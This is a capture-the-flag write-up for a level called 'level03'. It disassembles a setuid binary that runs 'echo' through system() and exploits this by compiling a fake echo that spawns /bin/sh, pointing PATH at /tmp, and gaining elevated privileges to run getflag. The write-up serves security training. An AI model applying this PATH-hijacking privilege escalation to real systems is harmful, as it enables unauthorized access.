# LEVEL 03

There is a level03 binary in our home directory.

```
objdump -M intel -f .text -d ./level03
```


```
Understood flow of code 

get uid
get gid
store gid as arg1,2,3 for setresgid
store gid as arg1,2,3 for setresuid
then call `echo "exploit me"` from system() function
```

```
080484a4 <main>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       83 e4 f0                and    esp,0xfffffff0
 80484aa:       83 ec 20                sub    esp,0x20
 80484ad:       e8 ee fe ff ff          call   80483a0 <getegid@plt>
 80484b2:       89 44 24 18             mov    DWORD PTR [esp+0x18],eax
 80484b6:       e8 d5 fe ff ff          call   8048390 <geteuid@plt>
 80484bb:       89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
 80484bf:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484c3:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484c7:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484cb:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484cf:       8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484d3:       89 04 24                mov    DWORD PTR [esp],eax
 80484d6:       e8 05 ff ff ff          call   80483e0 <setresgid@plt>
 80484db:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484df:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484e3:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484e7:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 80484eb:       8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484ef:       89 04 24                mov    DWORD PTR [esp],eax
 80484f2:       e8 89 fe ff ff          call   8048380 <setresuid@plt>
 80484f7:       c7 04 24 e0 85 04 08    mov    DWORD PTR [esp],0x80485e0
 80484fe:       e8 ad fe ff ff          call   80483b0 <system@plt>
 8048503:       c9                      leave
 8048504:       c3                      ret
```

Since echo is called from system(), binary are found by the OS from PATH env variable

The idea to exploit this is to re-create our own echo binary, and make it call /bin/getflag

```
int main() {
    execvp("/bin/sh", NULL);
} 
// execvp will give the control of the current process (C program) to the command. So, the C program is instantly replaced with the actual command. (giving his current gid && uid perms)
```

```
cd /tmp; gcc echo.c -o echo
cd ~; export PATH=/tmp;
./level03
$ /bin/getflag
Check flag.Here is your token : xxxxxxxxxxxxxxxxxxxxx
```